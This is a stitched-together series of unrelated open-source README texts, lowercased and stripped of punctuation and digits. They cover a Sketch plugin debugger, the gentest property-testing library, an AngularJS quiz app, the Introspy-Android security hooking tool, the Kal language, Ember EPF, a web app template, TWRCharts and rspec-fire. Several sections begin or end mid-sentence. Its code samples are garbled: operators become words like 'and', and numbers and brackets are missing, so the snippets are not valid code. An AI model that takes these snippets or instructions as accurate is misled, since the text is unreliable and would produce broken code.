23211861,  the sketch app itself provides a very limited number of tools for plugins developers the most annoying things are the lack of convenient debugging tools and lack of documentation of available apis the aim of this project is to solve these two problems and provide newbie developers with a comprehensive information on plugins development for sketch app currently the most valuable feature of devtools is a built in console that makes it a breeze to debug your plugins and scripts i plan to work on this project futher to make development process even more easier sketch devtools uses a lot of undocmented and hidden apis of sketch app thus it might stop working with any update of the application  reveal plugins folder in finder sketch app menu plugins reveal plugins folder  copy downloaded zip file to the revealed folder and un zip it  you are ready to go starting from version    sketch devtools supports automatic notifications about new releases as soon as new version is available you will see the following popover screen with detailed info about the new release unfortunately automatic updates are not supported yet thus you have to update everything manually follow these steps to update your current version of sketch devtools to a new one  reveal plugins folder in finder sketch app menu plugins reveal plugins folder  quit sketch app  find and remove sketch devtools folder in revealed plugins folder  copy downloaded zip file to the plugins folder and un zip it  launch sketch app  launch devtools using command option k  mission complete new feature invalid import statements are now reported as a nice looking error box initial release with a bunch of bugs sketch devtools is just a regular plugin that uses some rocket science to survive in this cruel world since it s just a plugin there are some commands available command option k show and hide devtools command option shift k clear console devtools panel like any webkit inspector is bound to a specific document if you want to use console in the current sketch document you have to activate it using command option k shortcut as soon as you activate it all the log statements and errors from plugins executed in the document will be automatically redirected to this console all the logging techniques are desribed below sketch devtools console automatically handles all the exceptions and print statements you use the same print or log function for logging in custom script editor or external sketchplugin and js file without any additional libs just run the following script in the custom script editor javascript print hi handsome log yo yo yo print sketch it produces the following result since sketch devtools uses webkit for its ui there is a way to use rich text formatting in console you can pass any html formatted string into print or log function and it will be rendered as html i want to demonstrate it with something cool and totally useless here is an example of html formatted logging javascript print h adventure time bacon pancakes new york remix and h the result will be javascript var layer selection firstobject if layer layer iskindofclass msshapegroup class print h selected layer and h var color and layer style fill color hexvalue print color span class label style background color and color and and color and and span print bezier path this short logging statement produces the following result if you want to log an object combined with some text in a single line you have to escape html symbols first javascript function escapehtml string var entitymap amp  lt  gt  quot  x  x  nbsp nbsp nbsp nbsp return string string replace new regexp and n  g  function s return entitymap s replace and and g nbsp nbsp nbsp nbsp var layer selection firstobject if layer and and no html escaping print strong layer and strong and layer and and html symbols are escaped print strong layer and strong and escapehtml layer tostring in the following image you can see the difference between these two print statements if you plan to use html formatting in your logs a lot there is a ready to use solution this small library is very similar to webkit console api and contains a lot of useful methods for sketch specific logging html formatting and convenient things like timers counters tags etc then you have to select an editor you are using for sketch plugins development to do that follow the instructions below all the default print statements and error boxes have an url with the name of actual file and line number that generated the record for example lets run the following script javascript print selection print selection last it produces two records the first one is just a print statement the second is an error box both records have the previously mentioned url you can click on to go straight to the root of the problem or reveal the print statement location to quickly disable it you can use a quick jump to code feature to save some time here is the list of some half baked ideas and features i m planning to include in the future releases of sketch devtools the mit license mit copyright c  andrey shakhmin permission is hereby

work in progress consider it stability  being feedback welcome let s say we want to test this add function javascript function add x y return x and y we can begin by asking what properties should this function have one property is that it s commutative add x y should equal add y x for any integers x and y to test this we could write a function that accepts a particular pair of values for x and y and returns true if the property holds for those inputs javascript var ourproperty function x y return add x y add y x such a function is called a property in gentest but we re not quite finished we also need to tell gentest what x and y are so it can generate sample values for now let s restrict our input domain to integers which we can create using the gentest types int generator javascript var t gentest types forall t int t int  addition is commutative  function x y return add x y add y x we now have a complete example and can run the tests using the gentest executable npm install g gentest  then run gentest with your test file as an argument a property is a parameterized test a function that takes any number of arguments and returns a boolean together with a description of how to

the generated values of the given type javascript var powersoftwo gentest types fmap function n return math pow  n  gentest types int nonnegative gentest sample powersoftwo and and           a cousin of fmap where each generated value of type is mapped to a second generator  which is then sampled this allows you to combine generators in ways you couldn t with just fmap for example say you re testing a function similar to array prototype indexof  and you want arrays together with an element from the array javascript var t gentest types function isnonempty xs return xs length  and and helper generate non empty arrays of ints var intarray t suchthat isnonempty t arrayof t int var arrayandelement t bind intarray and and this function takes an array value  generated by the inner and and generator intarray  and returns a generator in this case and and of elements selected from the array paired with the array and and itself function ints return t tuple t elements ints  t constantly

the predicate pred this should be a predicate that will pass most of the time you can t use this to select for relatively rare values like prime numbers perfect squares strings with balanced parentheses etc a common use case is non empty arrays javascript function isnonempty xs return xs length  var nonemptyarray t suchthat isnonempty t arrayof t int if you can it s better to generate the values you want directly instead of filtering for them for example this is a not so great way to generate multiples of  var threesbad t suchthat function n return n    t int nonnegative this is a better way more reliable and efficient var threesgood t fmap function n return n   t int nonnegative a design goal of gentest is that you as a user should never have to write your own generators from scratch instead everything you need to test should be expressible in terms of the primitives above and the higher order generators like fmap and bind by doing it this way you get shrinking and repeatability of test cases automatically for your new types how does this work in practice let s say you have a rectangle class which contains x and y coordinates a width a height and a method to test if it s colliding with another rectangle var rect function x y w h this x x this y y this w w this h h rect prototype iscolliding function other and and to make a rect  you essentially just need to create x y width and height values and pass them to the constructor you can generate the values using tuple t tuple t int t int and and x y t int positive t int positive and and width height we don t want and and these to be  or negative  then map a function over each generated value var genrect t fmap function tuple return new rect tuple   tuple   tuple   tuple  t tuple t int t int t int positive t int positive and now use genrect in your properties just like a built in type forall genrect  rectangles collide with themselves  function rect return rect iscolliding rect avoid calling math random in your functions since if you do so test runs won t be repeatable all randomness should come from the built in generators if the generator you want seems impossible to write check the may be missing and feel free to ask for help but in general with fmap and bind you have a lot of power to build more sophisticated generators gentest is heavily influenced by
14989968, the purpose of the challenge is to present a work from home challenge to developers interviewing for positions on angularjs projects their challenge is to create an online html application and i preface the request with a comment that this is a non trivial request imposed on the candidate but such a challenge has huge benefits in that it  allows a review team myriad opportunities to perform a full suite assessment of the developer candidate and  it also removes much of the time factor from the challenge candidates can use their own tools own resources and invest significantly more time into the project than would otherwise be available in a single screensharing session such as google hangout ideally you have candidates to whom you can present this challenge candidates that have not seen and studied the solution presented here the developer candidate is asked to implement an angularjs web application that will allow users to take a quiz evaluate the given answers and present a review of quiz scoring to the user and tester the review should show the correct answers and when appropriate also show the tester their incorrect answers logout should also be supported after the review in presented six  questions are initially provided without answers to the actual questions once the developer has finished to whatever level they decide is appropriate  the developer should configure a github repository as well as an online verion of the live app how the demo is deployed is up to the developer upon completion or partial completion of the challenge the review team s assessment will consider factors such as motivation attitude and competence skill levels best practices coding style clarity of code architecture solutions component implementation and dry ness solution usability and user testing features and more the developer should note that the challenge is expected to require approximately   hours of effort the developer should use angularjs jasmine bonus points for use of haml and coffeescript additionally the developer should avoid jquery rely on angularjs jqlite where possible organize project in a way that makes sense provide sufficient test coverage for all javascript quizzler is an angularjs online quiz builder and testing application developed as a deliverable to a challenge presented to developers who are interviewing at www xxx com using angularjs v  x and requirejs quizzler is architected with minimum coupling and crisp bootstrapping headjs is used to asynchronously load the required scripts before bootstrapping the ng application quizzler supports  n quizes defined in json format the quiz data is dynamically loaded and the dynamic workflow will guide the tester thru  n questions quiz questions can contain html with references to external images etc extra application features added to the implementation include use of requirejs with angularjs authentication module session management history navigation question validation enhanced logging and more here is a brief explanation of the directory structures client directory contains the source code css html and vendor libraries for quizzler build directory contains the bower settings initial files for travis deployment and pending grunt files for builds tools directory contains a coffeescript webserver that allows developers to easily run and debug quizzler docs directory contains the initial challenge requirements pdf and mockups to install the project download entire repository to local project directory and open a terminal window at local project directory then use bower to install the vendor tools and libraries and grunt to install the build tools cd and build bower install npm update use terminal to start the coffeescript built in quizzler web server web server provided in the tools directory cd and client coffee and tools and webserver and run coffee a deployment process is now available to deploy your application in development mode or production mode development mode deploys copy all the class files to the webroot and uses requirejs to lazy load required class files use the following terminal commands cd and build grunt dev production deploys use grunt requirejs to concatenate minimize and deploy a production version of quizzler all application code is compressed into webroot and assets and js and quizzler js cd and build grunt prod considering the short deliverable time for this solution the current implementation has several aspects that should and must be improved implementation of multiple quizes with quiz selector persistence of quiz results reduction and clarity improvement of css using lesscss improved ux for login input fields color code when errors occur input fields clear state indicators when typing focus indicators improved implementation of register auto restore last signin email look ahead for email field improved ux for quiz hover indicators for questions field for user submitted questions and comments timer for entire quiz breadcrumbs for quiz animation of questions as user selects continue or submit splash preloading screen with progress indicator header bar with email footer bar with copyright information additionally developer workflow processes could be significantly improved with the following use of grunt for builds and deploys use of git pre commit hooks to run tests use of jshint checks deployment to jenkins and travis for ci and testing use of coffeescript instead of hand written javascript minification of application code note launching of jasmine unit tests and execution of karma should be considered in complete and are currently in progress
15100309, introspy android blackbox tool to help understand what an android application is doing at runtime and assist in the identification of potential security issues description  introspy android comprises two separate components a gui interface to configure hooks filters and options and a cydia substrate extension containing the core of the tool functionalities including hooks and analysis of potential issues introspy android can be installed on a rooted device and dynamically configured to hook security sensitive android apis at run time the tool records all the relevant api calls made by an application including function calls arguments and return values it then perform tests for security issues in real time and persists the results in a database and in the android logging system the introspy analyzer can then be used to analyse a database generated by the tracer and generate html reports containing the list of logged function calls as well as a list of potential vulnerabilities affecting the application  install introspy android core apk on a device where cydia substrate is installed with adb install introspy android core apk install introspy android config apk adb install introspy android config apk the instrospy android config application displays apps the core application will hook and the various filters and options applied to them this application need root access you can use supersu to give temporary root access to the application the changes are dynamic and you do not need to restard the applications for them to be effective once configured with the config application logs are dumped in the system logs and in a database in the directory of the application hooked in databases and introspy db it should be noted that the core application can work on a device running android   and above whereas the config application can only run from android   on due to the use of specific apis in order to test applications on older sdks without the gui by only using the core application you can simply create a file named introspy config containing filters you want to hook in the directory of the applications you want to test example adb shell su c echo general crypto key hash fs ipc pref uri webview and data and data and com yourappname and introspy config adb uninstall com introspy core adb uninstall com introspy config this tool has not been tested on all versions of android if the tool does not work on your version please send us your error logs adb logcat s instrospyerror if due to the error the phone does not boot anymore you can still connect to it via adb and simply remove the extension to fix it with adb shell su c rm and data and app and com introspy core if you still have issues it may be due to cydia substrate itself which may not be compatible with your device to uninstall it you can do the following from cydia substrate s website by holding down the volume up button on your device you can disable substrate while it is attempting to load modifications such as while it is turning on and starting this will give you an opportunity to use google play to uninstall things that might be broken reporting  relevant data including potential issues related to the apis hooked is dumped in a database and in the system logs you can do the following commands to display them display the complete logs adb logcat s introspy display potential issues adb logcat s introspy w use the android version of the analyzer tbd it will be pushed to a different github repository soon to generate an html formatted report checking the stack traces option within the config tool will dump a relevant call stack comprising of  calls for the selected filters log encrypted and decrypted data before and after calls and the algo used note readable data is displayed if at least  of characters are readable unreadable characters are stored as if data is not readable it is stored as base  spot static ivs and broken algorithms spot weak rng

all preferences when getall is called this is done only once to avoid noise log world read and writeable prefs warn for access to preferences that don t exist could be a hidden preferences to enable logs for instance warn if ssl is used but any hostname is validated for a valid cert warn if the app validates any cert self signed etc log if cert pinning is potentially implemented log if ssl not used log when js plugins or fs access are enabled for a webview warn and log when a js interface is used js bridge log data passed to execsql update  insert  replace doing it yourself  most users should just download and install the pre compiled packages however if you want to modify the tool s functionality you will have to clone the source repository and build the packages yourself notes some methods simply cannot be hooked due to potential issues in cydia substrate and the hook may just crash the process also make sure to not try hooking abstract methods as it just throws an exception that is never caught by cydia substrate and will just crash the process you need to hook their implementation which is sometimes not documented but can be easily found in the android code base for example android content context is implemented in android content contextimpl see and license marc blanchou

synchronous value or may be a promise asynchronously fulfilled the when function takes a value that may be a promise or a normal value for the first function and when the value is ready executes the function provided as the second argument immediately in the case of a non promise normal value the value returned from when is the result of the execution of the provided function and returns a promise if provided a promise or synchronously returns a normal value if provided a non promise value this makes it easy to chain computations together this allows us to write code that is agnostic to

6665365, kal is expressive and offers many useful synonyms and constructs to make code readable in almost plain english kal is designed with a unique philosophy  eliminate the yucky parts of javascript but keep the good stuff including the compatibility and the great server and client runtime support  make code as readable as possible and make writing code straightforward eliminate the urge and the need to be terse and complicated  provide an alternative to callbacks which look weird and promises which are weird while providing excellent easy to use asynchronous support check out the examples and examples for some sample use cases sudo npm install g kal sudo may not be required depending on how you installed node file an issue on github or send a pull request if you have something to add if you need the latest and greatest possibly unstable and broken build you can build kal manually most users can skip this section and just use the latest npm version kal is written in kal so you need a prebuilt version of the compiler available to do the initial build sudo npm install g kal then you can clone the repo install the developer dependencies and build the compiler npm install npm run script make run the tests to make sure everything is going well if you re extra serious you can use your new build to rebuild itself in case there were any notable changes to the compiler between the npm release and the latest commit this will also run the tests npm run script bootstrap now install your latest version using npm assuming the tests pass this will make an archive file that you can install the filename depends on the version sudo npm install g kal  x x tgz alternatively you can just run the scripts and kal file if you don t want to install it globally if you installed kal globally using the g option  you can run the interactive shell by running kal with no arguments kal hello and and world hello world you can use the kal utility to run or compile files run kal h for the full option set if you installed kal locally didn t use the g option  you will need to specify the path to the kal executable usually located at nodemodules and kal and scripts and kal kal path and to and file kal runs the specified file kal o path and for and output path and to and file kal path and to and file kal compiles all files and directories listed to javascript and writes the output into the folder specified by o using the j or javascript switches will show the output of the compiler if you import kal in your javascript code it installs a compile hook that allows you to directly import kal files javascript require kal require and mykalfile and and refers to mykalfile kal as of    kal is written in literate kal in kal spaces for indentation are significant and tabs are not valid indents are required for function definitions and blocks of code inside of if statements try and catch blocks and loops you should use two spaces to denote an indent you can technically use any multiple of two spaces but two is recommended as a style guideline any whitespace on blank lines is ignored semicolons at the end of statements are not required nor are they valid in general single statements cannot contain line breaks notable exceptions are list and object definitions for example a   c  will work however is invalid future versions may include better support for line breaks within statements comments are preceeded by a sign anything after the on the line will be ignored print  this is a comment multiline comments are enclosed by a multiline functions are defined with an optional name and a list of arguments function myfunction arg arg return arg and arg myfunction function arg arg return arg and arg both define a variable myfunction that takes two arguments and returns their sum coffeescript syntax is also valid myfunction arg arg return arg and arg but is generally discouraged unless it significantly helps readability it was originally included to ease porting of the kal compiler from coffeescript to kal coffee style functions must contain a line break after the is not supported functions can have default arguments these will be used if the specified argument is null or undefined function defaultargs xy  return x and y print defaultargs  prints  functions are called using parentheses myfunction   will return  parentheses are optional if the function has at least one argument myfunction   is also valid function calls can be chained this way as well so any of the following print myfunction  print myfunction   print myfunction   will all print  when calling a function with no arguments parentheses are required tasks are similar to functions except that they are intended to be called asynchronously usually using a wait for statement task mytask arg return arg  mytask task arg return arg  tasks should not be called synchronously if a task is called synchronously it will return with no value when called asynchronously print mytask  is valid syntax but will print undefined wait for x from mytask  will print  as expected see the wait for section for more details on asynchronous calls objects and arrays are defined similarly to javascript newlines are valid inside of an array or object definition and indentation is ignored commas are optional when followed by a newline coffeescript style object definitions no s are only valid in assignments and must be preceded by a newline a    c a b c d  a  b  function definitions are only valid in coffeescript style object definitions at this time a  b  d function return  e return  objects work like javascript objects because they are javascript objects  so you can access members either using array subscripts or notation print x a prints  print x b prints  variables are declared automatically and scoped within the current function unless used globally like coffeescript by default nothing in your kal file will leak to the global scope everything is wrapped within a function scope inside the module if you need to export variables to global scope you should use module exports myexport myvariableorfunction in node js window myexport myvariableorfunction in a browser or you can compile the file with the bare option the following defines a conditional statement if x is  print five will print five if x is  print five print not five will print not five the conditional has useful synonyms when is equivalent to if unless is equivalent to if not except when is equivalent to if not otherwise is equivalent to else so the following is valid as are other permutations unless name is steve print impostor otherwise print steve else and synonyms can be chained with if and synonyms  so if name is steve print steve else if name is brian print brian otherwise when name is joe print joe print somebody is valid conditionals can also tail a statement print  if   will do nothing conditionals can be used in a ternary statement as well print  if name is joe otherwise  will print  if the variable name is equal to joe  otherwise it will print  kind of like it says parentheses are required because tail conditionals associate right meaning the following are equivalent print  if name is joe otherwise  print  if name is joe otherwise  for loops work as follows for x in  print x will print the numbers   and  the value n the right of the for in expression is called the iterant currently it must be an array python like iterable object support is coming soon for in loops can also have an index variable for x at index in  print index x will print the         for loops can also be used on objects obj a b  for key of obj print key obj key will print a  and b  when used on asynchronous code the parallel and series specifiers are available for parallel x in y wait for z from f x for series x in y wait for z from f x series is the default if neither is specified parallel for loops are not guaranteed to execute in order in fact they often won t take special care when accessing variables separated by wait for asynchronous statements remember that a wait for releases control of execution so other loop iterations running in parallel may alter local variables if you are not careful see the wait for section for more details you can use a generator object as follows for val from generatorobject print val a generator object is any object that has a next method the loop will keep calling the next method until it does not return a value returns undefined in javascript speak you can also use a range of numbers as an implicit generator to save memory for val from  to  will not instantiate a giant list print val while loops continuously run their code block until a condition is satisfied while x  print x prints the numbers  through  until provides a similar function until x is  print x list comprehensions are a quick and useful way to create an array from another array y  x value  for value in y will set x equal to  comprehensions also support an iterable object iterable objects support a next method which returns the next value in the sequence each time it is called when there are no more values in the sequence it should return null class randomlist method initialize size me counter size method next me counter  if me counter  return math random return null x r  for r in new randomlist  will set x to an array of  random numbers between  and  list comprehensions work on objects too obj a  b  x p for property p in obj a  b x v for property value v in obj   x p and v for propert p with value v in obj a  b conditionals in list comprehensions are also supported newlist i for i in oldlist if i  listed below are kal s operators and their other language equivalents note that kal has a lot of synonyms for some keywords all of which compile to the same function and kal and coffeescript and javascript and function and and and and and and and true  yes  on and true  yes  on and true and boolean true and and false  no  off and false  no  off and false and boolean false and and and  but and and and and boolean and and and or and or and code   and code and boolean or and and nor and none and none

log and console log and alias for console log and kal implements the same existential operator features of coffeescript with the addition of the exists and doesnt exist keyword suffixes which perform the same function as the operator examples a a  b  print c exists false print c doesnt exist true print c false print c something throws an error print c something prints undefined print a a  print a a true print b   print c error print c prints undefined classes are defined with member method definitions methods are just functions that are added to the prototype of new instance objects in other words they are available to all instances of a class the initialize method if present is used as the constructor when the new keyword is used me or its synonym this is used in methods to access the current instance of the class instanceof checks if an object is an instance of a class class person method initialize name me name name method printname print me name method namelength return me name length jen new person jen jen printname prints jen print jen instanceof person prints true classes can inherit from other classes and override or add to their method definitions the super keyword can be used in a method to call the same function in the parent class class frumpyperson inherits from person method printname print frumpy and me name method namelength return  sue new frumpyperson sue sue printname prints frumpy sue print sue instanceof person prints true print sue instanceof frumpyperson prints true print jen instanceof frumpyperson prints false you can add or alter a method or task to a class after it is defined or from another file using late binding using the of keyword class myclass method mymethod v me v v x new myclass x mymethod  print x v prints  method mymethod v of myclass me v v and  method myothermethod of myclass print me v x new myclass x mymethod  x myothermethod prints  try and catch blocks work similarly to javascript and coffeescript finally blocks are not supported yet but are coming eventually the throw statement and its synonyms raise and fail with work like javascript as well a horse and  what are we doing this will throw an error b  never runs print caught it  e the e variable above stores the error object thrown with throw or by the system you can give it any name you want and it is optional the following is valid throw a string b  never runs print caught it try and catch blocks can be nested try blocks can contain asynchronous wait for calls but catch blocks cannot at this time strings can either be double quoted or single quoted backslashes can be used to escape quotes within strings if necessary x this is a string with quotes in it y so is this z this one is too but i m not proud of it double quoted strings can contain interpolated values using blocks these blocks can contain any valid kal expression including variables and function calls this is the recommended way to do string concatenation as it is usually more readable print this is a string with the number   and  and  this is a string with the number   print the a says n  n  n the cow says moo moo moo kal supports javascript s regex syntax but not coffeescript style block regex syntax the wait for statement executes a task and pauses execution yielding to the runtime until the task is complete the following reads a file asynchronously and prints its contents in node js fs require fs wait for data from fs readfile and home and user and file txt print data tostring note that for users familiar with node js and javascript fs readfile is called with the file name argument and a callback you don t need to supply a callback after the wait for line execution is paused and other code can run keep this in mind if you have global variables that are modified asynchronously as they may change between the wait for line and the line after it any errors reported by fs readfile returned via callback will be thrown automatically you should wrap the wait for in a try and catch if you want to catch these errors wait for can be used to call your own asynchronous tasks it can also be used within for and while loops try blocks if statements and any nesting combination you can think of really fs require fs task readfilesafe filename if secret in filename throw illegal access wait for d from fs readfile filename return d for parallel filename in secret and data txt  test txt  test txt wait for data from readfilesafe and home and secret and file txt print data tostring catch error print error error print done wait for can also be used without arguments by omitting the from keyword wait for mytask some node js api functions like http get don t follow the normal convention of calling back with an error argument for these functions you must use the safe prefix otherwise it will throw an error http require http print request responsecode wait for statements also support multiple return values wait for a b from mytask you can pause for a specified amount of time using the pause for keyword print starting pause for  second print done pause for uses javascript s settimeout function note that the argument is in seconds not milliseconds like settimeout the second keyword is optional seconds also works use your best judgement to keep your code readable pause for  seconds is implied pause for  seconds also valid milliseconds  pause for milliseconds and  seconds expressions are valid for the timeout you can kick off tasks in parallel with the run in parallel block run in parallel task wait for task a b c wait for x from task safe wait for y z from task print all tasks finished code after the run in parallel block will not run until all tasks have completed if any errors are thrown by one or more tasks an array of errors will be thrown after all tasks in the block complete or fail array elements are in the order that the tasks were specified if no error was thrown by a task its error element will be undefined doesnt exist will be true safe waits will not check for errors run in parallel taskthatfails taskthatsucceeds catch errors print errors  prints the error thrown by taskthatfails print errors  exists prints false a shorthand syntax for the following a myobj a b myobj b c myobj sea d myobj subprop d is available with the unpack into statement unpack myobj into a b sea as c subprop d as d

10223466, ember js persistence foundation epf is a robust and stable framework for syncing client state with a persistent backend such as a rest api or socket connection defining characteristics of epf include correctness is paramount all other features including performance are important but secondary built around synchronization models are never locked and framework semantics assume updates are always coming in from a backend full support for relationships related models can be saved concurrently and the framework will automatically order requests around foreign key dependencies robust handling of conflicts and errors forking models is first class within the framework all operations are structured around javascript promises for now as epf is in development follow the development instructions to use epf the build browser command will create browser compatible distributables in the dist folder include epf js in the page after ember js by default epf assumes that the backend is a rest api which sticks to pretty much the same conventions as ember data s restadapter needs there are a few differences however epf sets a clientid in the json for every model and expects this to be echoed back by the server it uses this to keep it s internal idmap up to date related keys still need to use id and ids this is different from ember data   beta  all models within epf are subclasses of ep model for example app post ep model extend title ep attr string  body ep attr string  comments ep hasmany app comment  user ep belongsto app user the primary means of interacting with epf is through a session epf automatically injects a primary session into all routes and controllers to load data you can use the load method on the session app postroute ember route extend model function params return this session load post  params postid for compatibility with the behavior of the ember js router a find method is also placed on models the above code is equivalent to app postroute ember route extend model function params return app post find params postid the find method is the only method that is available on the models themselves and it is recommended to go through the session directly by default ember js will automatically call the find method so the above route can actually be simplified to app postroute ember route extend and and no model method required ember js will automatically call find on app post the session object also has other methods for finding data such as query to mutate models simply modify their properties post title updated title to persist changes to the backend simply call the flush method on the session object post title updated title session flush in epf most things are promises in the above example you could listen for when the flush has completed using the promise api post title updated title session flush then function models and and this will be reached if the flush is successful  function models and and this will be reached only if there are errors sessions can be flushed at any point even if other flushes are pending and re trying errors is as simple as performing another flush post title updated title session flush then null function and and the reject promise callback will be invoked on error and and do something here that should correct the error e g fix validations session flush and and flush again models also have an errors property which will be populated when the backend returns errors changes can be isolated easily using child sessions var post session load app post  var childsession session newsession and and this creates a child session var childpost childsession load app post  and and this record instance is separate from its corresponding instance in the parent session post childpost and and returns false they are separate instances post isequal childpost and and this will return true childpost title something and and this will not affect post childsession flush and and this will flush changes both to the backend and the parent session at this point post will have its title updated to reflect childpost to build epf follow the instructions below cd epf npm install npm test to run the tests via mocha you can join the email discussion help as well as discuss new features and directions for epf please post any questions interesting things you discover or links to useful sites for epf users

8134705, a list and detail and view template for an open web app but addresses the following issues  it uses the html and css that all the system apps use as well which means they re rock solid and will have a native look nd feel  modularization in views and controllers and services is nice this means we can keep the code clean and structured  by taking advantage of the view system of angularjs we also get routing for free managing routing state by hand is not something enjoyable  offline capabilties the application itself will run without an internet connection as well even if you are running it as a hosted application plus there are handlers available to cache rd party data  also works in webkit browsers so you can also use this template as general mobile app starting kit clone this repository run npm install run and nodemodules and bower and bin and bower install open www and index html click add packaged app  and point to the www folder when adding a new javascript file a controller a service anything don t forget to add the file in the array in www and js and main js this way requirejs knows that it should load the file when adding new view templates only the templates in the root of www and views are cached subfolders aren t processed at the moment pr welcome when navigating around please don t use normal links use the ng tap navigate go and my and url  forward directive the second argument can be forward  backward  popup  popdown depending on the animation the release build enables the following options javascript combination and minification css combination and minification offline capabilities through appcache angularjs view caching with a total of three requests in now required to load the application one html one css and one javascript request excluding images of course the only difference between them is that a hosted app will contain an to build packaged app node build js hosted app node build js appcache the build will be outputted in the and dist directory if you want to host this application from any static website just upload the content of the and dist folder to it the application will also work offline if you built with appcache flag to run on a device zip up the content of the and dist folder and publish to the marketplace or install through the app manager if you are building a release build of this application the application already runs without an internet connection however you will need to take the following things in consideration when extending the application  add css files as an import rule in  add ui parts and images that you need to directory subdirectories are not cached  the appcache will be updated everytime you do a build remember that appcache works by showing the old version first before updating so you ll need to refresh to see the new version this demo application has all data in memory however we also have added options to load data from a third party source and still keep your application available offline we provide you with the http service the apis are compatible  that has an extra option available idbcache this option allows you to cache request responses in indexeddb contrary to angularjs s default caching model that only caches in memory this way you can cache requests over subsequent page loads the beauty of it is that if there is no internet connection everything can be loaded from cache even when expiration time has passed this allows you full flexibility of updating data whenever there is a connection and still provide the user with an offline experience here is code on how to use it javascript this is an api service that handles all communication with the backend define app  function app and and we require http as a dependency app factory api  http  function http and and we have one method var api getindex function forceskipcache and and get an example url same syntax as http get and and this is the cache configuration idbcache and and the key under which we need to cache cachekey api index  and and expiration time in ms from now this is  minutes and and this is only obeyed if there is an internet connection expiresinms    and and set to true to always go to the server and and if there is an internet connection otherwise cache is still used forceskipcache forceskipcache   return api now to cache sub pages that the user hasn t viewed yet you can use the idbcache to already load them after page load when the user now clicks through the data will be loaded from cache and the overall experience of the application will be much better as long as the correct expiration and cache control headers are set this is the case in this example application  you can preload images the way you would normally do it and these results will be cached in the normal http cache also when there is no internet connection for example javascript var img new image img src somedatafromtheserver image if you want to add a new view animation you can do it completely in css we use keyframe animations through ng animate to create the transitions and have the following format you ll need to add the webkit fallbacks as well and the new view and main view animationname ng enter animation openanim  s forwards and the current view and main view animationname ng leave animation closeanim  s forwards and the new view gets pushed from the right  to  and keyframes openanim  transform translatex   transform translatex  and the current view gets pushed from  to the left  and keyframes closeanim  transform translatex   transform translatex  when the animation is done the element will be removed from the dom so don t worry now to use it from code add somewhere in html or from your controller javascript scope go and path and to and somewhere  animationname
19210035, twrcharts  an obj c wrapper for chartjs easily build animated charts by leveraging the power of native code twrcharts is yet another charting library for ios twrcharts is basically an effort to port the famous chartjs javascript library to native obj c code its power lies in the fact that it gives developers the flexibility to choose between loading a chartjs javascript file more on this later into a twrchartview or using native methods to build either a line and bar or circular pie and doughnut chart loading the chart from a javascript file is very easy though little configurable and dynamic whereas by using the native extension the user can update and refresh data on the fly the final choice is up to you native code api does not yet support all type of charts provided by chartjs only line bars pies and doughnuts are currently available twrcharts s main class is twrchartview  a subclass of uiwebview backed by an html file that the user never has to deal with the api has been engineered to make it feel like a fully native experience both from a developer and an end user point of view usage is easy add the dependency to your podfile platform ios pod twrcharts run pod install to install the dependencies next import the header file wherever you want to use the custom view in the xcode target build phases add the files index html and chart js under copy bundle resources just declare a twrchartview property in your header file and instantiate it as you would do with a normal view by defining its frame rect then just add it to your controller s view hierarchy and and chart view chartview twrchartview alloc initwithframe cgrectmake     and and optionally assign here a js file see below and and add the chart view to the controller s view self view addsubview chartview drop in your xcode project a js file and make sure it s been added to the resources that are being bundled with the project in the build phases of your project then just get a handle on the file and set its path to the twrchartview that s being added to the controller s view nsstring jsfilepath nsbundle mainbundle pathforresource file oftype js chartview setchartjsfilepath jsfilepath var

polararea polardata if you re planning on to use js files to load your charts be sure to make the following as the first line of your js file var context document getelementbyid canvas getcontext d this code retrieves the correct context from the html file that backs the twrchartview depending on the type of chart you want to plot bar and line and pie you need to instantiate different objects but mainly you need to follow these steps instantiate data objects instantiate a chart object by passing the data objects along with labels load the chart object onto the chart view here s some example code and and build chart data twrdataset dataset twrdataset alloc initwithdatapoints      twrdataset dataset twrdataset alloc initwithdatapoints      nsarray labels a  b  c  d  e and and instantiate the chart object twrlinechart line twrlinechart alloc initwithlabels labels datasets dataset dataset animated no and and load the chart object onto the view chartview loadlinechart line twrdataset which represents the data for bar and line charts can be instantiated with the following init method instancetype initwithdatapoints nsarray datapoints fillcolor uicolor fillcolor strokecolor uicolor strokecolor pointcolor uicolor pointcolor pointstrokecolor uicolor pointstrokecolor you can customize the fill and stroke colors for either the bar or the line chart for the latter one you can also choose the point fill and point stroke colors at a minimum you have to provide the data points which is an array of nsnumbers line and bar charts can be instantiated as such instancetype initwithlabels nsarray labels datasets nsarray datasets animated bool animated when passing the chart objects to the chart view you need to call one of the following methods called on your instance of twrchartview according to the type of object you are dealing with void loadbarchart twrbarchart barchart void loadlinechart twrlinechart linechart a sweet final touch you even have an option to call the above methods with a completion handler to get a callback whenever the chart animation finishes you wouldn t even guess that there s a bunch of javascript code running underneath void loadbarchart twrbarchart barchart withcompletionhandler twranimationcompletionblock block void loadlinechart twrlinechart linechart withcompletionhandler twranimationcompletionblock block and finally circular charts can be instantiated with the following method instancetype initwithvalues nsarray values colors nsarray colors type twrcircularcharttype type animated bool animated you even get a chance to choose the chart type either a pie chart twrcircularcharttypepie or a doughnut twrcircularcharttypedoughnut and again once you have the chart object you can add it to the chart view with one of the following two methods called on your instance of twrchartview void loadcircularchart twrcircularchart circularchart void loadcircularchart twrcircularchart circularchart withcompletionhandler twranimationcompletionblock block twrcharts requires ios  x or greater

2320857, totally obsolete  rspec fire has been completely subsumed by the verifying feature in rspec  which uses the same api it s not just a port the rspec  ones are strictly better leaving this here for posterity but patches will not be accepted and there will be no further releases rspec fire  checks that stubbed methods on your test double exist but still allow you to run in isolation when you choose a failure will be triggered if an invalid method is being stubbed once a younger brother came to him and asked father i have made and kept my little rule my fast my meditation and silence i strived to cleanse my heart of thoughts what more must i do the elder rose up and stretched out his hands his fingers became like ten lamps ablaze he said why not be totally changed into fire desert way charlie hunter test doubles are sweet for isolating your unit tests but we lost something in the translation from typed languages ruby doesn t have a compiler that can verify the contracts being mocked out are indeed legit this hurts larger refactorings since you can totally change a collaborator renaming methods changing the number of arguments and all the mocks that were standing in for it will keep pretending everything is ok rspec fire mitigates that problem with very little change to your existing coding style one solution would be to disallow stubbing of methods that don t exist this is what mocha does with its mocha configuration prevent stubbingnonexistentmethod option the downside is you now have to load the collaborators and dependencies that you are mocking which kind of defeats the purpose of isolated testing not ideal another solution that rspec fire adopts is a more relaxed version that only checks that the methods exist if the doubled class has already been loaded no checking will happen when running the spec in isolation but when run in the context of the full app either as a full spec run or by explicitly preloading collaborators on the command line a failure will be triggered if an invalid method is being stubbed it s a gem gem install rspec fire bit of setup in your spechelper rb require rspec and fire rspec configure do and config and config include 